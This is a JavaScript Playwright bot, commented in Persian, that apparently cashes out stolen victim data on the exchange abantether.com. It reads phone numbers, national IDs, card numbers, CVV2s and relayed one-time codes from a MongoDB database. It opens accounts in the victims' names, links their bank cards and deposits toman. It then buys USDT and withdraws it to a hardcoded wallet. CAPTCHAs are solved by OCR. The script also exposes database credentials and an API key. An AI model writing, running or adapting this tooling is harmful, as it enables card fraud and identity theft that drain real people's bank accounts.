const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

class AbanTetherBot {
    constructor() {
        // تنظیمات MongoDB
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        // تنظیمات سایت
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 45000,
            headless: true,
            slowMo: 100
        };
        
        // تنظیمات تراکنش
        this.transaction = {
            depositAmount: '5000000',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            usdtAmount: '40',
            maxRetries: 3,
            retryDelay: 5000
        };
        
        // تنظیمات AI برای خواندن کپچا
        this.aiConfig = {
            ocrApi: 'https://api.ocr.space/parse/image',
            apiKey: 'K87096188988957' // API رایگان
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.isRunning = true;
        this.processingUsers = new Set();
        this.browser = null;
        this.context = null;
        this.page = null;
        this.currentUser = null;
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        
        try {
            // اتصال به MongoDB
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ متصل به MongoDB');
        } catch (error) {
            console.error('❌ خطا در اتصال به MongoDB:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای چک هر 30 ثانیه
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                // اگر کاربر در حال پردازش است، ردش کن
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                // اگر تعداد تلاش‌ها بیش از حد مجاز است
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز');
                    continue;
                }
                
                // شروع پردازش
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        // علامت‌گذاری کاربر به عنوان در حال پردازش
        this.processingUsers.add(phoneNumber);
        
        try {
            // آپدیت وضعیت به در حال پردازش
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0)
                    },
                    $inc: { __v: 1 }
                }
            );
            
            // اجرای مراحل پردازش
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            // حذف کاربر از لیست در حال پردازش
            this.processingUsers.delete(phoneNumber);
        }
    }

    async executeUserProcess(user) {
        this.currentUser = user;
        
        try {
            // راه‌اندازی مرورگر
            await this.launchBrowser();
            
            console.log(`🌐 مرحله 1: ثبت‌نام برای ${user.personalPhoneNumber}`);
            
            // ثبت‌نام
            await this.registerUser();
            
            // ورود با رمز عبور
            await this.loginWithPassword();
            
            // تکمیل اطلاعات هویتی
            await this.completeIdentityInfo();
            
            // ثبت قرارداد بانکی
            await this.registerBankContract();
            
            // واریز تومان
            await this.depositToman();
            
            // خرید تتر
            await this.buyUSDT();
            
            // برداشت تتر
            await this.withdrawUSDT();
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'login', 'identity', 'bank', 'deposit', 'buy', 'withdraw'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            await this.closeBrowser();
        }
    }

    async launchBrowser() {
        this.browser = await chromium.launch({
            headless: this.website.headless,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        });
        
        this.context = await this.browser.newContext({
            viewport: { width: 1280, height: 720 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            locale: 'fa-IR'
        });
        
        this.page = await this.context.newPage();
        await this.page.setDefaultTimeout(this.website.timeout);
    }

    async closeBrowser() {
        if (this.page) await this.page.close();
        if (this.context) await this.context.close();
        if (this.browser) await this.browser.close();
        
        this.page = null;
        this.context = null;
        this.browser = null;
    }

    async registerUser() {
        await this.page.goto(this.website.registerUrl, { waitUntil: 'networkidle' });
        
        // وارد کردن شماره موبایل
        await this.fillFieldByPlaceholder('شماره موبایل خود را وارد کنید', this.currentUser.personalPhoneNumber);
        
        // کلیک روی دکمه ثبت نام
        await this.clickButtonByText('ثبت نام');
        
        // انتظار برای صفحه OTP
        await this.page.waitForSelector('input[type="tel"], input[type="number"]', { timeout: 10000 });
        
        // انتظار برای OTP در دیتابیس
        console.log('⏳ منتظر OTP لاگین...');
        const otpLogin = await this.waitForFieldInDatabase('otp_login');
        if (!otpLogin) {
            throw new Error('OTP لاگین دریافت نشد');
        }
        
        // وارد کردن OTP
        await this.enterOtp(otpLogin);
        
        // کلیک روی مرحله بعد
        await this.clickButtonByText('مرحله بعد');
        
        await this.page.waitForTimeout(3000);
    }

    async loginWithPassword() {
        // وارد کردن رمز عبور
        await this.fillFieldByPlaceholder('رمز عبور خود را وارد نمایید', 'ImSorryButIhaveTo@1');
        
        // کلیک روی تایید
        await this.clickButtonByText('تایید');
        
        await this.page.waitForTimeout(3000);
    }

    async completeIdentityInfo() {
        // پر کردن کد ملی
        await this.fillFieldByLabel('کد 10 رقمی شناسایی خود را وارد کنید', this.currentUser.personalNationalCode);
        
        // پر کردن تاریخ تولد
        await this.fillFieldByPlaceholder('روز/ماه/سال', this.currentUser.personalBirthDate);
        
        // کلیک روی ثبت
        await this.clickButtonByText('ثبت');
        
        await this.page.waitForTimeout(5000);
        
        // بررسی اگر باکس تایید باز شد
        try {
            await this.clickButtonByText('ادامه', 2000);
        } catch (error) {
            // باکس باز نشده، ادامه می‌دهیم
            console.log('باکس تایید باز نشد');
        }
    }

    async registerBankContract() {
        // کلیک روی کیف پول
        await this.clickElementByText('کیف پول');
        
        // کلیک روی واریز
        await this.clickElementByText('واریز');
        
        // کلیک روی تومان
        await this.clickElementByText('تومان');
        
        await this.page.waitForTimeout(2000);
        
        // باز کردن صفحه افزودن قرارداد
        await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
        
        // کلیک روی افزودن قرارداد
        await this.clickButtonByText('افزودن قرارداد');
        
        await this.page.waitForTimeout(2000);
        
        // انتخاب بانک بر اساس فیلد bank در دیتابیس
        const bankName = this.currentUser.bank || 'ملی';
        await this.selectDropdownByLabel('نام بانک', bankName);
        
        // انتخاب مدت قرارداد
        await this.selectDropdownByLabel('مدت قرار داد', '1 ماه');
        
        // کلیک روی ثبت و ادامه
        await this.clickButtonByText('ثبت و ادامه');
        
        await this.page.waitForTimeout(3000);
        
        // پردازش بر اساس بانک
        switch(bankName) {
            case 'ملی':
                await this.processMelliBank();
                break;
            case 'ملت':
            case 'کشاورزی':
            case 'تچارت':
            case 'مهرایران':
                await this.processGenericBank(bankName);
                break;
            default:
                await this.processGenericBank('ملی');
        }
        
        await this.page.waitForTimeout(5000);
    }

    async processMelliBank() {
        // کلیک روی ورود با کارت بانک ملی
        await this.clickButtonByText('ورود با کارت بانک ملی');
        
        await this.page.waitForTimeout(3000);
        
        // پر کردن شماره کارت
        await this.fillFieldByLabel('شماره کارت', this.currentUser.cardNumber);
        
        // خواندن و پر کردن کپچا
        await this.fillCaptcha();
        
        // کلیک روی ارسال رمز فعالسازی
        await this.clickButtonByText('ارسال رمز فعالسازی');
        
        // انتظار برای رمز دوم در دیتابیس
        console.log('⏳ منتظر رمز دوم...');
        const otpCard = await this.waitForFieldInDatabase('otp_register_card');
        if (!otpCard) {
            throw new Error('رمز دوم دریافت نشد');
        }
        
        // وارد کردن رمز دوم
        await this.fillFieldByLabel('رمز فعالسازی', otpCard);
        
        // کلیک روی ادامه
        await this.clickButtonByText('ادامه');
        
        // کلیک روی ثبت قرارداد
        await this.clickButtonByText('ثبت قرارداد');
    }

    async processGenericBank(bankName) {
        // این بخش برای بانک‌های دیگر
        // پر کردن شماره کارت
        await this.fillFieldByLabel('شماره کارت', this.currentUser.cardNumber);
        
        // پر کردن CVV2
        await this.fillFieldByLabel('CVV2', this.currentUser.cvv2);
        
        // پر کردن ماه انقضا
        await this.fillFieldByPlaceholder('ماه', this.currentUser.bankMonth.toString());
        
        // پر کردن سال انقضا
        await this.fillFieldByPlaceholder('سال', this.currentUser.bankYear.toString());
        
        // خواندن و پر کردن کپچا
        await this.fillCaptchaGeneric();
        
        // کلیک روی دریافت رمز پویا
        await this.clickButtonByText('دریافت رمز پویا');
        
        // انتظار برای رمز دوم در دیتابیس
        console.log('⏳ منتظر رمز دوم...');
        const otpCard = await this.waitForFieldInDatabase('otp_register_card');
        if (!otpCard) {
            throw new Error('رمز دوم دریافت نشد');
        }
        
        // وارد کردن رمز دوم
        await this.fillFieldByLabel('رمز دوم', otpCard);
        
        // کلیک روی تایید
        await this.clickButtonByText('تایید');
    }

    async depositToman() {
        // پر کردن مبلغ
        await this.fillFieldByLabel('مبلغ واریزی (تومان)', this.transaction.depositAmount);
        
        // انتخاب بانک
        const bankName = this.currentUser.bank || 'ملی';
        await this.selectDropdownByLabel('نام بانک', bankName);
        
        // کلیک روی واریز
        await this.clickButtonByText('واریز');
        
        // کلیک روی تایید و پرداخت
        await this.clickButtonByText('تایید و پرداخت');
        
        await this.page.waitForTimeout(3000);
        
        // پردازش صفحه بانک
        await this.processBankPayment(bankName);
        
        await this.page.waitForTimeout(5000);
    }

    async processBankPayment(bankName) {
        // این بخش باید بر اساس صفحه هر بانک پیاده‌سازی شود
        // در حال حاضر یک پیاده‌سازی عمومی
        
        try {
            // پر کردن شماره کارت
            await this.fillFieldByLabel('شماره کارت', this.currentUser.cardNumber);
            
            // پر کردن CVV2
            await this.fillFieldByLabel('CVV2', this.currentUser.cvv2);
            
            // پر کردن تاریخ انقضا
            await this.fillFieldByLabel('تاریخ انقضا', `${this.currentUser.bankMonth}/${this.currentUser.bankYear}`);
            
            // خواندن کپچا
            await this.fillCaptchaGeneric();
            
            // کلیک روی پرداخت
            await this.clickButtonByText('پرداخت');
            
        } catch (error) {
            console.log('صفحه بانک متفاوت است، تلاش روش جایگزین...');
            
            // روش جایگزین: کلیک روی دکمه پرداخت مستقیم
            try {
                await this.clickButtonByText('پرداخت اینترنتی');
            } catch (e) {
                // ادامه می‌دهیم
            }
        }
    }

    async buyUSDT() {
        await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { waitUntil: 'networkidle' });
        
        // پر کردن مقدار خرید
        await this.fillFieldByPlaceholder('مقدار', this.transaction.usdtAmount);
        
        // کلیک روی ثبت سفارش
        await this.clickButtonByText('ثبت سفارش');
        
        await this.page.waitForTimeout(5000);
    }

    async withdrawUSDT() {
        await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { waitUntil: 'networkidle' });
        
        // انتخاب رمزارز
        await this.selectDropdownByLabel('رمز ارز', 'تتر');
        
        // انتخاب شبکه
        await this.selectDropdownByLabel('شبکه برداشت', 'BSC(BEP20)');
        
        // وارد کردن آدرس ولت
        await this.fillFieldByLabel('آدرس ولت مقصد', this.transaction.withdrawAddress);
        
        // وارد کردن مقدار
        await this.fillFieldByLabel('مقدار', this.transaction.usdtAmount);
        
        // کلیک روی ثبت برداشت
        await this.clickButtonByText('ثبت برداشت');
        
        await this.page.waitForTimeout(5000);
    }

    async fillCaptcha() {
        try {
            // گرفتن اسکرین‌شات از کپچا
            const captchaElement = await this.page.$('.captcha-container img, img[src*="captcha"], img[src*="base64"]');
            
            if (captchaElement) {
                // گرفتن اسکرین‌شات
                const screenshot = await captchaElement.screenshot();
                
                // خواندن کپچا با OCR
                const captchaText = await this.readCaptchaWithOCR(screenshot);
                
                if (captchaText) {
                    // پیدا کردن فیلد کپچا و پر کردن
                    const captchaInput = await this.page.$('input[name*="captcha"], input[placeholder*="کپچا"], input[placeholder*="عبارت"]');
                    if (captchaInput) {
                        await captchaInput.fill(captchaText);
                        console.log(`✅ کپچا وارد شد: ${captchaText}`);
                    }
                }
            }
        } catch (error) {
            console.log('خطا در خواندن کپچا:', error);
            // اگر کپچا خوانده نشد، کاربر می‌تواند به صورت دستی وارد کند
        }
    }

    async fillCaptchaGeneric() {
        try {
            // روش جایگزین برای پیدا کردن کپچا
            const captchaSelectors = [
                'img[src*="captcha"]',
                'img#captcha-img',
                '.captcha img',
                'img[alt*="captcha"]',
                'img[src*="base64"]'
            ];
            
            for (const selector of captchaSelectors) {
                const captchaElement = await this.page.$(selector);
                if (captchaElement) {
                    const screenshot = await captchaElement.screenshot();
                    const captchaText = await this.readCaptchaWithOCR(screenshot);
                    
                    if (captchaText) {
                        // پیدا کردن فیلد متناظر
                        const inputSelectors = [
                            'input[name*="captcha"]',
                            'input[name*="security"]',
                            'input[placeholder*="کپچا"]',
                            'input[placeholder*="عبارت"]',
                            'input#captcha'
                        ];
                        
                        for (const inputSelector of inputSelectors) {
                            const input = await this.page.$(inputSelector);
                            if (input) {
                                await input.fill(captchaText);
                                console.log(`✅ کپچا وارد شد: ${captchaText}`);
                                return;
                            }
                        }
                    }
                }
            }
        } catch (error) {
            console.log('خطا در خواندن کپچا:', error);
        }
    }

    async readCaptchaWithOCR(imageBuffer) {
        try {
            // استفاده از OCR.space API (رایگان)
            const formData = new FormData();
            const blob = new Blob([imageBuffer], { type: 'image/png' });
            
            // در Node.js نیاز به polyfill داریم
            // اینجا یک روش ساده‌تر استفاده می‌کنیم
            const base64Image = imageBuffer.toString('base64');
            
            const response = await axios.post(this.aiConfig.ocrApi, {
                base64Image: `data:image/png;base64,${base64Image}`,
                apikey: this.aiConfig.apiKey,
                language: 'eng' // یا 'fas' برای فارسی
            }, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            if (response.data && response.data.ParsedResults && response.data.ParsedResults.length > 0) {
                const text = response.data.ParsedResults[0].ParsedText;
                // تمیز کردن متن
                return text.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
            }
        } catch (error) {
            console.log('خطا در OCR:', error);
        }
        
        return null;
    }

    async fillFieldByPlaceholder(placeholderText, value) {
        const selector = `input[placeholder*="${placeholderText}"]`;
        await this.page.waitForSelector(selector, { timeout: 10000 });
        await this.page.fill(selector, value);
        console.log(`✅ پر کردن فیلد ${placeholderText}: ${value}`);
        await this.page.waitForTimeout(500);
    }

    async fillFieldByLabel(labelText, value) {
        const selectors = [
            `label:has-text("${labelText}") + input`,
            `//label[contains(text(), '${labelText}')]/following::input[1]`,
            `input[name*="${labelText}"]`,
            `input[placeholder*="${labelText}"]`
        ];
        
        for (const selector of selectors) {
            try {
                await this.page.waitForSelector(selector, { timeout: 2000 });
                await this.page.fill(selector, value);
                console.log(`✅ پر کردن فیلد ${labelText}: ${value}`);
                return;
            } catch (error) {
                continue;
            }
        }
        
        throw new Error(`فیلد با لیبل "${labelText}" پیدا نشد`);
    }

    async clickButtonByText(buttonText, timeout = 5000) {
        const selectors = [
            `button:has-text("${buttonText}")`,
            `a:has-text("${buttonText}")`,
            `input[type="submit"][value*="${buttonText}"]`,
            `//button[contains(text(), '${buttonText}')]`
        ];
        
        for (const selector of selectors) {
            try {
                await this.page.waitForSelector(selector, { timeout: 2000 });
                await this.page.click(selector);
                console.log(`🖱️ کلیک روی: ${buttonText}`);
                await this.page.waitForTimeout(1000);
                return;
            } catch (error) {
                continue;
            }
        }
        
        // تلاش با XPath
        try {
            const xpath = `//*[contains(text(), '${buttonText}')]`;
            const elements = await this.page.$$(xpath);
            for (const element of elements) {
                if (await element.isVisible()) {
                    await element.click();
                    return;
                }
            }
        } catch (error) {
            // continue
        }
        
        throw new Error(`دکمه "${buttonText}" پیدا نشد`);
    }

    async clickElementByText(elementText) {
        const selector = `:text("${elementText}")`;
        await this.page.waitForSelector(selector, { timeout: 5000 });
        await this.page.click(selector);
        console.log(`🖱️ کلیک روی المنت: ${elementText}`);
        await this.page.waitForTimeout(1000);
    }

    async selectDropdownByLabel(labelText, optionText) {
        // پیدا کردن سلکتور بر اساس لیبل
        const selectSelector = `select[name*="${labelText}"], select[id*="${labelText}"]`;
        
        try {
            await this.page.waitForSelector(selectSelector, { timeout: 3000 });
            await this.page.selectOption(selectSelector, optionText);
            console.log(`✅ انتخاب ${labelText}: ${optionText}`);
        } catch (error) {
            // روش جایگزین: پیدا کردن با XPath
            const xpath = `//label[contains(text(), '${labelText}')]/following::select[1]`;
            try {
                await this.page.waitForSelector(`xpath=${xpath}`, { timeout: 3000 });
                await this.page.selectOption(`xpath=${xpath}`, optionText);
            } catch (e) {
                throw new Error(`سلکتور با لیبل "${labelText}" پیدا نشد`);
            }
        }
    }

    async enterOtp(otp) {
        console.log(`🔢 وارد کردن OTP: ${otp}`);
        
        // جستجوی فیلدهای OTP
        const otpInputs = await this.page.$$('input[type="tel"], input[type="number"], input[maxlength="1"]');
        
        if (otpInputs.length >= 4) {
            for (let i = 0; i < Math.min(otpInputs.length, 6); i++) {
                if (otp[i]) {
                    await otpInputs[i].fill(otp[i]);
                }
            }
            return;
        }
        
        // جستجوی فیلد تک
        const singleInput = await this.page.$('input[type="tel"], input[type="number"]');
        if (singleInput) {
            await singleInput.fill(otp);
            return;
        }
        
        throw new Error('فیلد OTP پیدا نشد');
    }

    async waitForFieldInDatabase(fieldName, maxAttempts = 90) {
        console.log(`⏳ منتظر پر شدن ${fieldName}...`);
        
        let attempts = 0;
        while (attempts < maxAttempts) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: this.currentUser.personalPhoneNumber },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    console.log(`✅ ${fieldName} دریافت شد: ${user[fieldName]}`);
                    return user[fieldName];
                }
                
                attempts++;
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.error(`خطا در چک کردن ${fieldName}:`, error);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        console.log(`⏰ زمان انتظار برای ${fieldName} به پایان رسید`);
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
            console.log(`✅ کاربر ${phoneNumber} به عنوان تکمیل‌شده علامت‌گذاری شد`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason,
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (shouldRetry) {
                updateData.$inc.retryCount = 1;
            } else {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
            console.log(`❌ کاربر ${phoneNumber} به عنوان ناموفق علامت‌گذاری شد: ${reason}`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        console.log('🛑 پاکسازی منابع...');
        this.isRunning = false;
        
        if (this.mongoClient) {
            await this.mongoClient.close();
            console.log('✅ اتصال MongoDB بسته شد');
        }
    }
}

// مدیریت خطاهای غیرمنتظره
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

// اجرای اصلی
async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        await bot.startPolling();
        
        // مدیریت خاتمه برنامه
        process.on('SIGINT', async () => {
            console.log('\n🛑 دریافت سیگنال خاتمه...');
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            console.log('\n🛑 دریافت سیگنال ترمینیت...');
            await bot.cleanup();
            process.exit(0);
        });
        
        console.log('🤖 ربات آماده کار است. Ctrl+C برای توقف.');
        
        // نگه داشتن برنامه در حال اجرا
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

// اگر این فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;